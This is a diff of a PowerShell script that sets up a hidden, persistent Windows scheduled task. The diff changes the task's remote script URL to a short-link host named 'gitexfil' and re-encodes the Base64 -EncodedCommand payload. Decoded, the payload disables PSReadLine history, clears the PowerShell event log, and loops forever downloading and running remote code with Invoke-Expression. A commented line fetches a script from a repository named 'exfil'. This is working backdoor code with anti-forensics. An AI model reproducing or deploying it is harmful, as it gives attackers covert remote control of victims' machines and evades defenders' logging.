@@ -6,8 +6,8 @@ https://tinyurl.com/highcmdvinstall <> TaskSchedulerServiceCreator.ps1
 https://tinyurl.com/highcmdactivation <> ActivationWithAutomatedInstall.ps1
 #>
 
+# Encoded Command
 <#
-Encoded commmand
 $AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
 foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
 Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
@@ -15,7 +15,7 @@ Clear-EventLog "Windows Powershell"
 $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent    
 while ($true) {
-    $url = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/ActiveAccessControl.ps1"
+    $url = "https://hook.short.gy/gitexfil"
     $response = Invoke-WebRequest -Uri $url -UseBasicParsing
     if ($response.StatusCode -eq 200) {
         $scriptContent = $response.Content
@@ -115,7 +115,7 @@ $rawscript = @'
   <Actions Context="Author">
     <Exec>
       <Command>powershell.exe</Command>
-      <Arguments>-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABBAHYAYQBpAGwAYQBiAGwAZQBUAGwAcwAgAD0AIABbAGUAbgB1AG0AXQA6ADoARwBlAHQAVgBhAGwAdQBlAHMAKAAnAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlACcAKQAgAHwAIABXAGgAZQByAGUALQBPAGIAagBlAGMAdAAgAHsAIAAkAF8AIAAtAGcAZQAgACcAVABsAHMAMQAyACcAIAB9AA0ACgBmAG8AcgBlAGEAYwBoACAAKAAkAHQAbABzAFAAcgBvAHQAbwBjAG8AbAAgAGkAbgAgACQAQQB2AGEAaQBsAGEAYgBsAGUAVABsAHMAKQAgAHsAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsACAALQBiAG8AcgAgACQAdABsAHMAUAByAG8AdABvAGMAbwBsAH0AIAAgACAAIAANAAoAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsADQAKACAAIAAgACAAJAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBjAG8AZABlAGIAZQByAGcALgBvAHIAZwAvAHMAZQBtAHAAaQBhAG0AcABpAC8AbQBhAHYAZQByAGkAYwBrAHMALwByAGEAdwAvAGIAcgBhAG4AYwBoAC8AbQBhAGkAbgAvAEcAbABvAGIAYQBsAEYAaQBsAGUAcwAvAEEAYwB0AGkAdgBlAEEAYwBjAGUAcwBzAEMAbwBuAHQAcgBvAGwALgBwAHMAMQAiAA0ACgAgACAAIAAgACQAcgBlAHMAcABvAG4AcwBlACAAPQAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwANAAoAIAAgACAAIABpAGYAIAAoACQAcgBlAHMAcABvAG4AcwBlAC4AUwB0AGEAdAB1AHMAQwBvAGQAZQAgAC0AZQBxACAAMgAwADAAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAHMAYwByAGkAcAB0AEMAbwBuAHQAZQBuAHQAIAA9ACAAJAByAGUAcwBwAG8AbgBzAGUALgBDAG8AbgB0AGUAbgB0AA0ACgAgACAAIAAgACAAIAAgACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABzAGMAcgBpAHAAdABDAG8AbgB0AGUAbgB0AA0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewB9AA0ACgAgACAAIAAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADYAMAAgAHwAIABPAHUAdAAtAE4AdQBsAGwADQAKAH0A</Arguments>
+      <Arguments>-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JEF2YWlsYWJsZVRscyA9IFtlbnVtXTo6R2V0VmFsdWVzKCdOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGUnKSB8IFdoZXJlLU9iamVjdCB7ICRfIC1nZSAnVGxzMTInIH0NCmZvcmVhY2ggKCR0bHNQcm90b2NvbCBpbiAkQXZhaWxhYmxlVGxzKSB7W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAkdGxzUHJvdG9jb2x9DQpTZXQtUFNSZWFkTGluZU9wdGlvbiAtSGlzdG9yeVNhdmVTdHlsZSBTYXZlTm90aGluZyB8IE91dC1OdWxsDQpDbGVhci1FdmVudExvZyAiV2luZG93cyBQb3dlcnNoZWxsIg0KJExvZ0VuZ2luZUxpZmVjeWNsZUV2ZW50ID0gJGZhbHNlIHwgT3V0LU51bGwNClt2b2lkXSRMb2dFbmdpbmVMaWZlY3ljbGVFdmVudCAgICANCndoaWxlICgkdHJ1ZSkgew0KICAgICR1cmwgPSAiaHR0cHM6Ly9ob29rLnNob3J0Lmd5L2dpdGV4ZmlsIg0KICAgICRyZXNwb25zZSA9IEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHVybCAtVXNlQmFzaWNQYXJzaW5nDQogICAgaWYgKCRyZXNwb25zZS5TdGF0dXNDb2RlIC1lcSAyMDApIHsNCiAgICAgICAgJHNjcmlwdENvbnRlbnQgPSAkcmVzcG9uc2UuQ29udGVudA0KICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAkc2NyaXB0Q29udGVudA0KICAgIH0gZWxzZSB7fQ0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDYwIHwgT3V0LU51bGwNCn0=</Arguments>
     </Exec>
   </Actions>
 </Task>
@@ -127,7 +127,7 @@ Get-ScheduledTask -TaskName $localtask -ErrorAction SilentlyContinue | Unregiste
 Register-ScheduledTask -TaskName $localtask -Xml $rawscript -TaskPath $taskpath -Force -ErrorAction SilentlyContinue -AsJob | Out-Null
 Start-ScheduledTask -TaskPath $taskpath -TaskName $localtask -ErrorAction SilentlyContinue
 #(Get-ScheduledTask -TaskName $localtask).state
-#Invoke-Expression(Invoke-WebRequest -Uri "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Sanitation/DeprecCoreTaskPurge.ps1" -UseBasicParsing).Content -AsJob
+#Invoke-Expression(Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Sanitation/DeprecCoreTaskPurge.ps1" -UseBasicParsing).Content -AsJob
 
 # cleanup
 if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
